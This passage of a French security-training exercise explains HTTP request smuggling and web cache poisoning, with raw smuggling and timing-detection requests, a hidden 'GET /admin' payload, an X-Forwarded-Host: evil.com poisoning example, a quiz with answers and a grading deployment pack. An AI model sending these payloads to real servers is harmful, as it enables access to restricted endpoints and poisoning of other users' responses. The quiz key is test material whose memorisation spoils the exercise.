username=admin&password=
0

```

#### 5.5.2 La RFC et la RÃ©alitÃ©

La RFC 7230 Section 3.3.3 stipule clairement :

> "If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length."

**En thÃ©orie** : Tous les serveurs devraient donner prioritÃ© Ã  `Transfer-Encoding`.

**En pratique** :
- Apache : Suit la RFC (prioritÃ© TE)
- Nginx : Peut Ãªtre configurÃ© diffÃ©remment
- HAProxy : Comportement configurable
- AWS ALB : A eu des bugs historiques

#### 5.5.3 Les Types de Smuggling

**CL.TE (Content-Length â†’ Transfer-Encoding) :**
```
Frontend : Lit Content-Length (ex: 44 bytes)
Backend  : Lit Transfer-Encoding (chunk "0" = fin)
RÃ©sultat : Le "surplus" reste dans le buffer du backend
```

**TE.CL (Transfer-Encoding â†’ Content-Length) :**
```
Frontend : Lit Transfer-Encoding (attend la fin des chunks)
Backend  : Lit Content-Length (ex: 4 bytes)
RÃ©sultat : Le backend ignore le reste, qui "smuggle" vers la prochaine requÃªte
```

**TE.TE (Transfer-Encoding â†’ Transfer-Encoding obfusquÃ©) :**
```
Frontend : ReconnaÃ®t "Transfer-Encoding: chunked"
Backend  : Ne reconnaÃ®t PAS "Transfer-Encoding: xchunked"
          â†’ Utilise Content-Length comme fallback
```

#### 5.5.4 DÃ©tection par Timing

La mÃ©thode de dÃ©tection la plus fiable utilise le timing :

**Test CL.TE :**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
- Si CL.TE : Le backend attend plus de donnÃ©es â†’ DÃ‰LAI
- Si TE.CL : Le backend rÃ©pond immÃ©diatement

**Test TE.CL :**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

12
XXXXXXXXXXXXXXXX
0

```
- Si TE.CL : Le backend lit seulement 4 bytes â†’ DÃ‰LAI (attend fin chunk)
- Si CL.TE : Le backend rÃ©pond immÃ©diatement

#### 5.5.5 Cache Poisoning

Le cache utilise une **cache key** pour indexer les rÃ©ponses, typiquement :
```
Cache Key = Scheme + Host + Path + Query String
```

Les headers comme `X-Forwarded-Host` ne sont souvent PAS dans la clÃ© mais SONT utilisÃ©s par l'application :

```
Attaquant envoie:
  GET /home
  X-Forwarded-Host: evil.com

Application gÃ©nÃ¨re:
  <link href="//evil.com/style.css">

Cache stocke avec clÃ© "/home":
  Response avec evil.com

Tous les utilisateurs reÃ§oivent:
  La version empoisonnÃ©e!
```

### 5.6 Normes avec explications pÃ©dagogiques

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ âŒ HORS NORME (payload incorrect)                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ POST / HTTP/1.1\nHost: target.com\n                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ âœ… CONFORME                                                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ POST / HTTP/1.1\r\nHost: target.com\r\n                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ğŸ“– POURQUOI ?                                                   â”‚
â”‚                                                                 â”‚
â”‚ â€¢ HTTP/1.1 RFC 7230 exige CRLF (\r\n) comme dÃ©limiteur         â”‚
â”‚ â€¢ Certains serveurs acceptent \n mais pas tous                  â”‚
â”‚ â€¢ Les payloads de smuggling doivent Ãªtre parfaitement formÃ©s    â”‚
â”‚ â€¢ Une erreur de format peut faire Ã©chouer l'attaque             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 5.7 Simulation avec trace d'exÃ©cution

**ScÃ©nario : DÃ©tection CL.TE avec Nginx â†’ Apache**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Ã‰tape â”‚ Action                                      â”‚ RÃ©sultat         â”‚ Explication         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   1   â”‚ Parser JSON input                           â”‚ Input valide     â”‚ Architecture dÃ©finieâ”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   2   â”‚ VÃ©rifier cl_te_test.response_delay          â”‚ true             â”‚ DÃ©lai dÃ©tectÃ©       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   3   â”‚ DÃ©terminer smuggling_type                   â”‚ CL.TE            â”‚ Frontend=CL         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   4   â”‚ DÃ©finir confidence                          â”‚ HIGH             â”‚ Timing fiable       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   5   â”‚ GÃ©nÃ©rer payload CL.TE                       â”‚ POST+smuggle     â”‚ Request hijacking   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   6   â”‚ Analyser unkeyed_headers                    â”‚ X-Forwarded-Host â”‚ Cache poison viable â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   7   â”‚ GÃ©nÃ©rer cache poisoning payload             â”‚ XSS via header   â”‚ Stored XSS          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   8   â”‚ CrÃ©er chained attack                        â”‚ Smuggle+Cache    â”‚ Impact critique     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   9   â”‚ GÃ©nÃ©rer mitigations                         â”‚ 5 recommandationsâ”‚ DÃ©fense en profondeurâ”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  10   â”‚ Retourner JSON complet                      â”‚ Rapport structurÃ©â”‚ Toutes analyses     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 5.8 MnÃ©motechniques

#### ğŸŒ€ MEME : "Inception" â€” RÃªves dans les RÃªves

![Inception Levels](inception_levels.jpg)

**"We need to go deeper!"** â€” Chaque niveau de l'architecture web (Frontend, Backend, Cache) interprÃ¨te les requÃªtes diffÃ©remment, comme les niveaux de rÃªves dans Inception.

```rust
// ğŸŒ€ CL.TE = Le rÃªve de Cobb (Content-Length)
//           vs le rÃªve d'Arthur (Transfer-Encoding)
if frontend_sees != backend_sees {
    // "The dream is collapsing!"
    vulnerability_detected();
}
```

#### ğŸ­ MEME : "Le Prestige" â€” Le Tour a 3 Parties

1. **The Pledge** (La Promesse) : Tu montres une requÃªte normale
2. **The Turn** (Le Tour) : Tu caches une deuxiÃ¨me requÃªte dedans
3. **The Prestige** (Le Prestige) : La victime reÃ§oit ta requÃªte cachÃ©e

```http
POST / HTTP/1.1           â† The Pledge
Content-Length: 44
Transfer-Encoding: chunked

0                         â† The Turn

GET /admin HTTP/1.1       â† The Prestige!
```

#### ğŸ§ª MEME : "Breaking Bad" â€” La PuretÃ© du Payload

Comme Walter White qui insiste sur 99.7% de puretÃ© pour sa mÃ©thamphetamine, ton payload HTTP doit Ãªtre **parfaitement formÃ©** :

- `\r\n` au lieu de `\n` = la diffÃ©rence entre succÃ¨s et Ã©chec
- Un octet de trop ou de moins = payload cassÃ©
- "I am the one who smuggles!"

### 5.9 Applications pratiques

| Domaine | Application |
|---------|-------------|
| **Bug Bounty** | Target privilÃ©giÃ©e pour bounties Ã©levÃ©s ($10k-$50k) |
| **Pentest Web** | Test systÃ©matique des architectures reverse proxy |
| **Red Team** | AccÃ¨s aux endpoints internes via smuggling |
| **Blue Team** | Configuration des WAF pour dÃ©tecter les patterns |
| **DevSecOps** | Audit des configurations Nginx/HAProxy |

---

## âš ï¸ SECTION 6 : PIÃˆGES â€” RÃ‰CAPITULATIF

| # | PiÃ¨ge | ConsÃ©quence | Solution |
|---|-------|-------------|----------|
| 1 | Confondre CL.TE / TE.CL | Payload inefficace | Comprendre qui lit quoi |
| 2 | Utiliser `\n` au lieu de `\r\n` | RequÃªte mal formÃ©e | Toujours CRLF |
| 3 | Oublier TE.TE | Rater une vulnÃ©rabilitÃ© | Tester les variants |
| 4 | Ignorer le cache | Rater l'amplification | Analyser les unkeyed headers |
| 5 | Mauvais calcul Content-Length | Payload tronquÃ©/Ã©tendu | Calculer prÃ©cisÃ©ment |
| 6 | Ne pas chaÃ®ner les attaques | Impact limitÃ© | Combiner smuggling + cache |

---

## ğŸ“ SECTION 7 : QCM

### Question 1
**Dans une vulnÃ©rabilitÃ© CL.TE, que signifie "CL.TE" ?**

- A) Content-Length cÃ´tÃ© client, Transfer-Encoding cÃ´tÃ© serveur
- B) Frontend utilise Content-Length, Backend utilise Transfer-Encoding
- C) Cache utilise Content-Length, Target utilise Encoding
- D) Content-Length est transfÃ©rÃ© encodÃ©
- E) Chunked-Length avec Transfer-Encoding
- F) Le contraire de TE.CL toujours
- G) Content-Length n'est pas utilisÃ© du tout
- H) Transfer-Encoding est ignorÃ© partout
- I) Les deux headers sont Ã©quivalents
- J) Aucune des rÃ©ponses ci-dessus

**RÃ©ponse : B**

---

### Question 2
**Quel header permet gÃ©nÃ©ralement le cache poisoning via unkeyed injection ?**

- A) Authorization
- B) Cookie
- C) X-Forwarded-Host
- D) Content-Type
- E) User-Agent (toujours keyed)
- F) Accept-Language
- G) Cache-Control
- H) Host (toujours keyed)
- I) Origin
- J) Referer

**RÃ©ponse : C**

---

### Question 3
**Dans un payload CL.TE, que reprÃ©sente "0\r\n\r\n" ?**

- A) ZÃ©ro octet de Content-Length
- B) La fin d'un chunk (chunked encoding terminator)
- C) Un commentaire HTTP
- D) Un header vide
- E) Une erreur de syntaxe
- F) Le dÃ©but du body
- G) Un timeout
- H) Une redirection
- I) Un code d'erreur
- J) Rien, c'est ignorÃ©

**RÃ©ponse : B**

---

### Question 4
**Comment dÃ©tecter une vulnÃ©rabilitÃ© CL.TE par timing ?**

- A) Envoyer une requÃªte et mesurer le temps de rÃ©ponse normal
- B) Envoyer une requÃªte avec CL > body rÃ©el et observer un dÃ©lai
- C) Envoyer plusieurs requÃªtes simultanÃ©es
- D) Utiliser un scanner automatique uniquement
- E) Analyser les logs serveur
- F) VÃ©rifier les headers de rÃ©ponse
- G) Tester avec diffÃ©rents User-Agents
- H) Modifier le Content-Type
- I) Envoyer des requÃªtes TRACE
- J) Observer les erreurs 400

**RÃ©ponse : B**

---

### Question 5
**Qu'est-ce qu'une attaque "Request Hijacking" via smuggling ?**

- A) Voler le cookie d'un utilisateur directement
- B) Faire que la requÃªte d'un autre utilisateur soit prÃ©fixÃ©e par du contenu attaquant
- C) Rediriger tout le trafic vers l'attaquant
- D) Intercepter les communications HTTPS
- E) Modifier le DNS
- F) Injecter un keylogger
- G) Exploiter une faille XSS classique
- H) Brute-forcer les credentials
- I) Scanner les ports ouverts
- J) Exploiter une RCE

**RÃ©ponse : B**

---

### Question 6
**Quelle est la principale diffÃ©rence entre TE.CL et CL.TE ?**

- A) L'un utilise HTTP/2, l'autre HTTP/1.1
- B) L'ordre des prioritÃ©s Frontend/Backend est inversÃ©
- C) TE.CL utilise le chiffrement, CL.TE non
- D) CL.TE fonctionne seulement sur Apache
- E) TE.CL nÃ©cessite JavaScript
- F) Les payloads sont identiques
- G) CL.TE est plus ancien
- H) TE.CL est considÃ©rÃ© non exploitable
- I) Ils ont le mÃªme comportement
- J) La diffÃ©rence est purement thÃ©orique

**RÃ©ponse : B**

---

### Question 7
**Qu'est-ce que TE.TE avec obfuscation ?**

- A) Double Transfer-Encoding identique
- B) Un variant de TE qui est interprÃ©tÃ© diffÃ©remment (ex: "xchunked")
- C) Transfer-Encoding chiffrÃ©
- D) Une technique de compression
- E) Un bug spÃ©cifique Ã  Nginx
- F) Une mÃ©thode de dÃ©tection uniquement
- G) Un type de cache poisoning
- H) Un header personnalisÃ©
- I) Une extension du protocole HTTP/2
- J) Un mÃ©canisme de dÃ©fense

**RÃ©ponse : B**

---

### Question 8
**Pourquoi HTTP/2 Ã©tait censÃ© rÃ©soudre le smuggling ?**

- A) Il utilise le chiffrement obligatoire
- B) Il utilise des frames binaires avec taille explicite au lieu de CL/TE
- C) Il bloque automatiquement les attaques
- D) Il n'autorise pas les POST requests
- E) Il valide tous les headers cÃ´tÃ© client
- F) Il n'existe pas de cache avec HTTP/2
- G) Les proxies HTTP/2 sont plus sÃ©curisÃ©s par design
- H) Le protocole est trop nouveau pour Ãªtre attaquÃ©
- I) Les navigateurs bloquent le smuggling HTTP/2
- J) HTTP/2 n'utilise pas de headers

**RÃ©ponse : B**

---

### Question 9
**Qu'est-ce qu'un "cache key" dans le contexte du cache poisoning ?**

- A) Une clÃ© de chiffrement pour le cache
- B) L'identifiant unique utilisÃ© pour indexer une rÃ©ponse en cache
- C) Un cookie de session
- D) Un token JWT
- E) L'adresse IP du serveur cache
- F) Le timestamp de la requÃªte
- G) Le nom du fichier en cache
- H) Une clÃ© SSH pour le serveur
- I) Un certificat SSL
- J) Un header obligatoire

**RÃ©ponse : B**

---

### Question 10
**Quelle est la mitigation la plus efficace contre le HTTP smuggling ?**

- A) Utiliser HTTPS
- B) Bloquer toutes les requÃªtes POST
- C) Utiliser HTTP/2 end-to-end ou normaliser le parsing CL/TE
- D) Augmenter la taille du timeout
- E) DÃ©sactiver le cache
- F) Utiliser un CDN
- G) ImplÃ©menter un CAPTCHA
- H) Limiter le rate limiting
- I) Utiliser des headers personnalisÃ©s
- J) Activer les logs dÃ©taillÃ©s

**RÃ©ponse : C**

---

## ğŸ“Š SECTION 8 : RÃ‰CAPITULATIF

| Ã‰lÃ©ment | Valeur |
|---------|--------|
| **Exercice** | 3.3.10-a HTTP Smuggling & Cache Attacks |
| **DifficultÃ©** | â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜† (9/10) |
| **XP Base** | 500 |
| **XP Bonus (ğŸ”¥)** | Ã—6 = 3000 |
| **Concepts clÃ©s** | CL.TE, TE.CL, TE.TE, Cache Poisoning, Host Header |
| **CWE** | CWE-444 (HTTP Request Smuggling) |
| **OWASP** | A05:2021 Security Misconfiguration |
| **Temps** | ~5h |

---

## ğŸ“¦ SECTION 9 : DEPLOYMENT PACK

```json
{
  "deploy": {
    "hackbrain_version": "5.5.2",
    "engine_version": "v22.1",
    "exercise_slug": "3.3.10-a-http_smuggling_cache_attacks",
    "generated_at": "2026-01-11T00:00:00Z",

    "metadata": {
      "exercise_id": "3.3.10-a",
      "exercise_name": "http_smuggling_cache_attacks",
      "module": "3.3.10",
      "module_name": "HTTP Smuggling & Cache Attacks",
      "concept": "a",
      "concept_name": "HTTP Request Smuggling & Web Cache Poisoning",
      "type": "code",
      "tier": 1,
      "tier_info": "Concept isolÃ©",
      "phase": 3,
      "difficulty": 9,
      "difficulty_stars": "â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†",
      "language": "rust",
      "language_version": "Edition 2024",
      "duration_minutes": 300,
      "xp_base": 500,
      "xp_bonus_multiplier": 6,
      "bonus_tier": "GÃ‰NIE",
      "bonus_icon": "ğŸ§ ",
      "complexity_time": "T3 O(nÂ²)",
      "complexity_space": "S2 O(n)",
      "prerequisites": ["3.3.1", "3.3.2", "HTTP/1.1", "Reverse Proxy"],
      "domains": ["Net", "Crypto", "Struct"],
      "domains_bonus": ["DP"],
      "tags": ["smuggling", "cache", "http", "web", "security"],
      "meme_reference": "Inception",
      "cwe_ids": ["CWE-444", "CWE-525"],
      "owasp_category": "A05:2021"
    },

    "files": {
      "spec.json": "/* Section 4.9 */",
      "references/ref_solution.rs": "/* Section 4.3 */",
      "references/ref_solution_bonus.rs": "/* Section 4.6 */",
      "alternatives/alt_state_machine.rs": "/* Section 4.4 */",
      "mutants/mutant_a_boundary.rs": "/* Section 4.10 */",
      "mutants/mutant_b_safety.rs": "/* Section 4.10 */",
      "mutants/mutant_c_resource.rs": "/* Section 4.10 */",
      "mutants/mutant_d_logic.rs": "/* Section 4.10 */",
      "mutants/mutant_e_return.rs": "/* Section 4.10 */",
      "mutants/mutant_f_edge_case.rs": "/* Section 4.10 */",
      "tests/main.rs": "/* Section 4.2 */"
    },

    "validation": {
      "expected_pass": [
        "references/ref_solution.rs",
        "references/ref_solution_bonus.rs",
        "alternatives/alt_state_machine.rs"
      ],
      "expected_fail": [
        "mutants/mutant_a_boundary.rs",
        "mutants/mutant_b_safety.rs",
        "mutants/mutant_c_resource.rs",
        "mutants/mutant_d_logic.rs",
        "mutants/mutant_e_return.rs",
        "mutants/mutant_f_edge_case.rs"
      ]
    },

    "commands": {
      "validate_spec": "python3 hackbrain_engine_v22.py --validate-spec spec.json",
      "test_reference": "cargo test --release",
      "test_mutants": "python3 hackbrain_mutation_tester.py -r references/ref_solution.rs -s spec.json --validate"
    }
  }
}
```

---

*"We need to go deeper!" â€” HTTP Smuggling est comme Inception : chaque couche de l'architecture a sa propre rÃ©alitÃ©, et l'exploit se cache dans les diffÃ©rences d'interprÃ©tation.*

*HACKBRAIN v5.5.2 â€” L'excellence n'a pas de raccourcis*
